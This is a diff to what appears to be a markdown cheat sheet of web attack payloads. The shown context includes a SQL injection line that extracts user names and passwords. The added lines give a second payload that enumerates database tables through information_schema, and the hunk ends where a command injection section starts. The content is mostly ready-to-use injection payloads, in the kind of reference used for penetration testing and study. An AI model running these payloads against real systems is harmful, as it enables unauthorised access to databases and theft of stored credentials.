@@ -75,6 +75,10 @@ etc.
 
 `‘ UNION ALL SELECT user, password FROM example.users #`
 
+* Display all tables in information_schema database:
+
+`%' and 1=0 union select null, table_name from information_schema.tables #`
+
 
 COMMAND INJECTION
 -----------------
